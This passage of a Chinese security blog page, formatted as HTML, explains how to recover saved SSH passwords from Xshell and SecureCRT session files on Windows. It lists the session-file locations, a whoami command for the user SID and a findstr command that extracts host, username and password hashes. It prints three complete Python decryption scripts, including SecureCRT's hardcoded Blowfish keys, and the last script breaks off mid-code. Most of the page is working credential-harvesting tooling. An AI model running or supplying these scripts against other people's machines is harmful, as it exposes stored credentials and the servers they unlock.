id="SSH密码"><a href="#SSH密码" class="headerlink" title="SSH密码"></a>SSH密码</h3><h4 id="Xshell密码"><a href="#Xshell密码" class="headerlink" title="Xshell密码"></a>Xshell密码</h4><p>默认保存路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">版本 路径</span><br><span class="line">Xshell 5 %userprofile%\Documents\NetSarang\Xshell\Sessions</span><br><span class="line">Xshell 6 %userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</span><br><span class="line">Xshell 7 %userprofile%\Documents\NetSarang Computer\7\Xshell\Sessions</span><br></pre></td></tr></table></figure><p>关于xshell加密方式可以查看<a href="https://rcoil.me/2019/09/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/">这篇文章</a></p><h4 id="Xshell-5-Xshell-6"><a href="#Xshell-5-Xshell-6" class="headerlink" title="Xshell 5&amp;Xshell 6"></a>Xshell 5&amp;Xshell 6</h4><p>首先需获取到用户的SID值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\ascotbe&gt; whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名           SID</span><br><span class="line">================ ==============================================</span><br><span class="line">樱岛麻衣\ascotbe S-1-5-21-1645164750-2672341361-3879437546-1000</span><br></pre></td></tr></table></figure><p>然后使用脚本解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\xshell.py -s username+sid -p &quot;文件路径&quot;</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41818.6pnato17dr.jpg" alt="Alt pic"></p><p>脚本代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line"><span class="comment">#pip install pycryptodome</span></span><br><span class="line"><span class="comment">#pip install pywin32</span></span><br><span class="line"><span class="keyword">from</span> win32api <span class="keyword">import</span> GetComputerName, GetUserName</span><br><span class="line"><span class="keyword">from</span> win32security <span class="keyword">import</span> LookupAccountName, ConvertSidToStringSid</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_string</span>(<span class="params">a1, a2</span>):</span><br><span class="line">    v1 = base64.b64decode(a2)</span><br><span class="line">    v3 = ARC4.new(SHA256.new(a1.encode(<span class="string">&#x27;ascii&#x27;</span>)).digest()).decrypt(v1[:<span class="built_in">len</span>(v1) - <span class="number">0x20</span>])</span><br><span class="line">    <span class="keyword">if</span> SHA256.new(v3).digest() == v1[-<span class="number">32</span>:]:</span><br><span class="line">        <span class="keyword">return</span> v3.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;xsh, xfp password decrypt&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-s&quot;</span>, <span class="string">&quot;--sid&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;`username`+`sid`, user `whoami /user` in command.&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;the password in sessions or path of sessions&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.sid:</span><br><span class="line">    args.sid = GetUserName() + ConvertSidToStringSid(LookupAccountName(GetComputerName(), GetUserName())[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.password:</span><br><span class="line">    args.password = os.path.join(os.environ[<span class="string">&quot;USERPROFILE&quot;</span>], <span class="string">r&quot;Documents\NetSarang Computer\6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(args.password):</span><br><span class="line">    r = decrypt_string(args.sid, args.password)</span><br><span class="line">    <span class="keyword">if</span> r:</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(args.password):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> f.endswith(<span class="string">&quot;.xsh&quot;</span>) <span class="keyword">or</span> f.endswith(<span class="string">&quot;.xfp&quot;</span>):</span><br><span class="line">            filepath = os.path.join(root, f)</span><br><span class="line">            cfg = configparser.ConfigParser()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cfg.read(filepath)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                cfg.read(filepath, encoding=<span class="string">&quot;utf-16&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> f.endswith(<span class="string">&quot;.xsh&quot;</span>):</span><br><span class="line">                    host = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(cfg[<span class="string">&quot;CONNECTION&quot;</span>][<span class="string">&quot;Host&quot;</span>], cfg[<span class="string">&quot;CONNECTION&quot;</span>][<span class="string">&quot;Port&quot;</span>])</span><br><span class="line">                    username = cfg[<span class="string">&quot;CONNECTION:AUTHENTICATION&quot;</span>][<span class="string">&quot;UserName&quot;</span>]</span><br><span class="line">                    password = decrypt_string(args.sid, cfg[<span class="string">&quot;CONNECTION:AUTHENTICATION&quot;</span>][<span class="string">&quot;Password&quot;</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    host = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Host&quot;</span>], cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Port&quot;</span>])</span><br><span class="line">                    username = cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;UserName&quot;</span>]</span><br><span class="line">                    password = decrypt_string(args.sid, cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Password&quot;</span>])</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">f&quot;<span class="subst">&#123;filepath:=^<span class="number">100</span>&#125;</span>\nHost:     <span class="subst">&#123;host&#125;</span>\nUsername: <span class="subst">&#123;username&#125;</span>\nPassword: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;filepath:=^<span class="number">100</span>&#125;</span>\nError:<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Xshell-7"><a href="#Xshell-7" class="headerlink" title="Xshell 7"></a>Xshell 7</h3><p>这个版本目前我没有找到解密方式，只能使用比较蠢的方式<br><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41819.lvir7yizs.gif" alt="Alt pic"></p><h4 id="SecureCRT密码"><a href="#SecureCRT密码" class="headerlink" title="SecureCRT密码"></a>SecureCRT密码</h4><p>保存位置如下，绿色版本的话在下载的文件夹中<br>版本 路径<br>全版本通用 %APPDATA%\VanDyke\Config\Sessions</p><h4 id="小于7-X版本"><a href="#小于7-X版本" class="headerlink" title="小于7.X版本"></a>小于7.X版本</h4><p>把*.ini文件拉取下来直接使用脚本解密，这个版本没有测试过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt SSHv2 passwords stored in VanDyke SecureCRT session files</span></span><br><span class="line"><span class="comment"># Can be found on Windows in:</span></span><br><span class="line"><span class="comment">#   %APPDATA%\VanDyke\Config\Sessions\sessionname.ini</span></span><br><span class="line"><span class="comment"># Tested with version 7.2.6 (build 606) for Windows</span></span><br><span class="line"><span class="comment"># Eloi Vanderbeken - Synacktiv</span></span><br><span class="line"><span class="comment">#  Decrypt SSHv2 passwords stored in VanDyke SecureCRT</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># C:\&gt;python SecureCRT-decryptpass.py -h</span></span><br><span class="line"><span class="comment"># usage: SecureCRT-decryptpass.py [-h] files [files ...]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#positional arguments:</span></span><br><span class="line"><span class="comment">#  files       session file(s)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#optional arguments:</span></span><br><span class="line"><span class="comment">#  -h, --help  show this help message and exit</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># C:\&gt;python SecureCRT-decryptpass.py C:\Users\user1\AppData\Roaming\VanDyke\Config\Sessions\192.168.0.1.ini</span></span><br><span class="line"><span class="comment"># C:\Users\user1\AppData\Roaming\VanDyke\Config\Sessions\192.168.0.1.ini</span></span><br><span class="line"><span class="comment"># ssh -p 22 user@192.168.0.1 # 123456</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">password</span>) :</span><br><span class="line">    c1 = Blowfish.new(<span class="string">&#x27;5F B0 45 A2 94 17 D9 16 C6 C6 A2 FF 06 41 82 B7&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>), Blowfish.MODE_CBC, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    c2 = Blowfish.new(<span class="string">&#x27;24 A6 3D DE 5B D3 B3 82 9C 7E 06 F4 08 16 AA 07&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>), Blowfish.MODE_CBC, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    padded = c1.decrypt(c2.decrypt(password.decode(<span class="string">&#x27;hex&#x27;</span>))[<span class="number">4</span>:-<span class="number">4</span>])</span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> padded[:<span class="number">2</span>] != <span class="string">&#x27;\x00\x00&#x27;</span> :</span><br><span class="line">        p += padded[:<span class="number">2</span>]</span><br><span class="line">        padded = padded[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> p.decode(<span class="string">&#x27;UTF-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">REGEX_HOSTNAME = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Hostname&quot;=([^\r\n]*)&#x27;</span>)</span><br><span class="line">REGEX_PASWORD = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Password&quot;=u([0-9a-f]+)&#x27;</span>)</span><br><span class="line">REGEX_PORT = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;D:&quot;\[SSH2\] Port&quot;=([0-9a-f]&#123;8&#125;)&#x27;</span>)</span><br><span class="line">REGEX_USERNAME = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Username&quot;=([^\r\n]*)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hostname</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_HOSTNAME.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_PASWORD.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> decrypt(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">port</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_PORT.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-p %d &#x27;</span>%(<span class="built_in">int</span>(m.group(<span class="number">1</span>), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">username</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_USERNAME.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>) + <span class="string">&#x27;@&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;files&#x27;</span>, <span class="built_in">type</span>=argparse.FileType(<span class="string">&#x27;r&#x27;</span>), nargs=<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    <span class="built_in">help</span>=<span class="string">&#x27;session file(s)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> args.files :</span><br><span class="line">    c = f.read().replace(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> f.name</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ssh %s%s%s # %s&quot;</span>%(port(c), username(c), hostname(c), password(c))</span><br></pre></td></tr></table></figure><h4 id="7-X版本"><a href="#7-X版本" class="headerlink" title="7.X版本"></a>7.X版本</h4><p>进入目录提取文件中的连接IP、端口、账号、hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr /si /c:&quot;Hostname&quot; /c:&quot;\&quot;Username\&quot;=&quot; /c:&quot;\&quot;Password\&quot;=&quot; /c:&quot;\&quot;[SSH2] Port\&quot;=&quot; *.ini</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41820.7p3e6u3yjt.jpg" alt="Alt pic"></p><p>然后使用脚本进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意去除hash的第一位 &quot;u&quot;</span></span><br><span class="line">python3  SecureCRT.py dec <span class="built_in">hash</span></span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41821.9nzkx69gve.jpg" alt="Alt pic"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, Blowfish</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecureCRTCrypto</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Initialize SecureCRTCrypto object.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.IV = <span class="string">b&#x27;\x00&#x27;</span> * Blowfish.block_size</span><br><span class="line">        <span class="variable language_">self</span>.Key1 = <span class="string">b&#x27;\x24\xA6\x3D\xDE\x5B\xD3\xB3\x82\x9C\x7E\x06\xF4\x08\x16\xAA\x07&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.Key2 = <span class="string">b&#x27;\x5F\xB0\x45\xA2\x94\x17\xD9\x16\xC6\xC6\xA2\xFF\x06\x41\x82\xB7&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self, Plaintext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Encrypt plaintext and return corresponding ciphertext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Plaintext: A string that will be encrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Hexlified ciphertext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        plain_bytes = Plaintext.encode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line">        plain_bytes += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">        padded_plain_bytes = plain_bytes + os.urandom(Blowfish.block_size - <span class="built_in">len</span>(plain_bytes) % Blowfish.block_size)</span><br><span class="line"></span><br><span class="line">        cipher1 = Blowfish.new(<span class="variable language_">self</span>.Key1, Blowfish.MODE_CBC, iv = <span class="variable language_">self</span>.IV)</span><br><span class="line">        cipher2 = Blowfish.new(<span class="variable language_">self</span>.Key2, Blowfish.MODE_CBC, iv = <span class="variable language_">self</span>.IV)</span><br><span class="line">        <span class="keyword">return</span> cipher1.encrypt(os.urandom(<span class="number">4</span>) + cipher2.encrypt(padded_plain_bytes) + os.urandom(<span class="number">4</span>)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">self, Ciphertext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Decrypt ciphertext and return corresponding plaintext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Ciphertext: A hex string that will be decrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Plaintext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        cipher1 = Blowfish.new(<span class="variable language_">self</span>.Key1, Blowfish.MODE_CBC, iv = <span class="variable language_">self</span>.IV)</span><br><span class="line">        cipher2 = Blowfish.new(<span class="variable language_">self</span>.Key2, Blowfish.MODE_CBC, iv = <span class="variable language_">self</span>.IV)</span><br><span class="line">        ciphered_bytes = <span class="built_in">bytes</span>.fromhex(Ciphertext)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ciphered_bytes) &lt;= <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        padded_plain_bytes = cipher2.decrypt(cipher1.decrypt(ciphered_bytes)[<span class="number">4</span>:-<span class="number">4</span>])</span><br><span class="line">        </span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_plain_bytes), <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> padded_plain_bytes[i] == <span class="number">0</span> <span class="keyword">and</span> padded_plain_bytes[i + <span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        plain_bytes = padded_plain_bytes[<span class="number">0</span>:i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> plain_bytes.decode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">raise</span>(ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecureCRTCryptoV2</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ConfigPassphrase : <span 